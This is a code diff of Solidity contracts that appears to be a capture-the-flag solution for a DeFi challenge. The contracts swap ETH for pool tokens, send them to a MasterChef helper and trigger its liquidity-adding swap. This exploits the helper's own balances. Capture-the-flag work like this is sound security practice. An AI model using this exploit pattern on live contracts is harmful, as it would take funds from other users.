@@ -1,7 +1,39 @@
 // SPDX-License-Identifier: GNU AGPLv3
 
-pragma solidity ^0.8.10;
-import "./UniswapV2Like.sol";
+pragma solidity 0.8.16;
+
+interface UniswapV2RouterLike {
+    function swapExactTokensForTokens(
+        uint256 amountIn,
+        uint256 amountOutMin,
+        address[] calldata path,
+        address to,
+        uint256 deadline
+    ) external returns (uint256[] memory amounts);
+
+    function addLiquidity(
+        address tokenA,
+        address tokenB,
+        uint256 amountADesired,
+        uint256 amountBDesired,
+        uint256 amountAMin,
+        uint256 amountBMin,
+        address to,
+        uint256 deadline
+    )
+        external
+        returns (
+            uint256 amountA,
+            uint256 amountB,
+            uint256 liquidity
+        );
+}
+
+interface UniswapV2PairLike {
+    function token0() external returns (address);
+
+    function token1() external returns (address);
+}
 
 interface ERC20Like {
     function transferFrom(
@@ -33,6 +65,10 @@ interface MasterChefLike {
 }
 
 interface IMasterChefHelper {
+    function router() external view returns (UniswapV2RouterLike);
+
+    function masterchef() external view returns (MasterChefLike);
+
     function swapTokenForPoolToken(
         uint256 poolId,
         address tokenIn,
@@ -42,23 +78,20 @@ interface IMasterChefHelper {
 }
 
 interface ISetup {
-    function mcHelper() external returns (address);
+    function mcHelper() external view returns (IMasterChefHelper);
+
+    function weth() external view returns (WETH9);
 }
 
-contract rescue {
-    WETH9 public constant weth = WETH9(address(0x0)); // To modify;
-    MasterChefLike public constant masterchef = MasterChefLike(address(0x0)); // To modify;
-    UniswapV2RouterLike public constant router =
-        UniswapV2RouterLike(address(0x0)); // To modify;
-    ISetup setup = ISetup(address(0x0)); // To modify;
-
-    function main() public payable returns (uint256) {
+contract Rescue {
+    function main(WETH9 weth, IMasterChefHelper mcHelper) external payable {
         require(msg.value > 10 ether, "need more than 10 ether");
 
-        IMasterChefHelper mc = IMasterChefHelper(address(setup.mcHelper()));
+        UniswapV2RouterLike router = mcHelper.router();
+        MasterChefLike masterchef = mcHelper.masterchef();
 
-        //first 2 pools are against weth
-        //lets find our tokenA and tokenB
+        // first 2 pools are against weth
+        // lets find our tokenA and tokenB
         uint256 poolId1 = 1;
         uint256 poolId2 = 2;
         (address lpToken1, , , ) = masterchef.poolInfo(poolId1);
@@ -73,7 +106,7 @@ contract rescue {
         address tokenB;
         (token0 == address(weth)) ? tokenB = token1 : tokenB = token0;
 
-        //now we want some weth to trade for tokenA
+        // now we want some weth to trade for tokenA
         weth.deposit{value: msg.value}();
 
         address[] memory path = new address[](2);
@@ -89,10 +122,10 @@ contract rescue {
             block.timestamp
         );
 
-        //and we transfer them to the mcHelper
-        ERC20Like(token).transfer(
+        // and we transfer them to the mcHelper
+        ERC20Like(tokenA).transfer(
             address(mcHelper),
-            ERC20Like(token).balanceOf(address(this))
+            ERC20Like(tokenA).balanceOf(address(this))
         );
 
         //now we want some tokenB to trigger the action of adding liquidity
@@ -105,9 +138,9 @@ contract rescue {
             block.timestamp
         );
 
-        //trigger
+        // trigger
         ERC20Like(tokenB).approve(address(mcHelper), type(uint256).max);
-        mc.swapTokenForPoolToken(
+        mcHelper.swapTokenForPoolToken(
             poolId1,
             address(tokenB),
             ERC20Like(tokenB).balanceOf(address(this)),
@@ -116,9 +149,10 @@ contract rescue {
     }
 }
 
-contract start {
-    constructor() payable {
-        rescuse r = new rescuse();
-        r.main{value: msg.value}();
+contract Solution {
+    // Send more that 10 ETH along with the deployment
+    constructor(ISetup setup) payable {
+        Rescue rescue = new Rescue();
+        rescue.main{value: msg.value}(setup.weth(), setup.mcHelper());
     }
 }
